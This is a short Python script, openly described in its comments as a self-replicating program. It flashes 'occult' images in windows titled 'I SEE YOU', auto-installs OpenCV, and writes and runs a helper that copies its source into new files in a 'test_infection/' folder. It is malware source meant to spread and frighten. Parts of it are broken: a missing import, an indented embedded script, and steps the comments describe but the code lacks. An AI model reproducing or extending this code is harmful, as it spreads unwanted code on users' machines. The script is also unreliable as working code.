# the purpose of the program is :
    # 1. at runtime, starts to display occult symbols as time goes by, 
        # which disappear later after their appearance. 3 windows maximum at the same time, 
        # if more close the oldest.
    # 2. replicates itself in files: with each infected file (thus with each replication), 
        # a horrific image is displayed, then disappears 1 second later. 
        # Then the modified file is executed.
        # So as time goes by, more and more file will be infected,
        # more and more horrific images will be displayed, faster and more often, in a chain reaction.

import importlib

def install(package):
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def import_or_install(package):
    try:
        importlib.import_module(package)
        print(f"{package} already installed")
    except ImportError:
        print(f"{package} not found. Installing...")
        install(package)

# vérifiez et installez les dépendances nécessaires
import_or_install("opencv-python")


import sys # to access the system
import cv2
import tkinter as tk
import random
import os
import subprocess

root = tk.Tk()

screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
symbols_folder = "symbols/"


for i in range(15):
    symbol_path = os.path.join(symbols_folder, random.choice(os.listdir(symbols_folder)))
    img = cv2.imread(symbol_path, cv2.IMREAD_ANYCOLOR)
    cv2.imshow("I SEE YOU" + str(i), img)
    cv2.moveWindow("I SEE YOU"+ str(i), random.randint(0, screen_width),random.randint(0, screen_height));
    cv2.waitKey(800)
    cv2.destroyWindow("I SEE YOU" + str(i-3))

with open("replication.py", "w") as f:
    f.write('''
    import os

    # ouvrir le fichier source
    with open('infestation.py', 'r') as f:
        source_code = f.read()

    # spécifiez le chemin d'accès au dossier pour écrire les fichiers
    folder_path = "test_infection/"

    # parcourir tous les fichiers du dossier
    for i, filename in enumerate(os.listdir(folder_path)):
        # vérifiez que le fichier est un fichier Python
        if filename.endswith(".py"):
            # ouvrir le fichier et écrire le code source
            with open(os.path.join(folder_path, f"infestation_{i}.py"), 'w') as f:
                f.write(source_code)
    ''')

subprocess.run(["python", "replication.py"])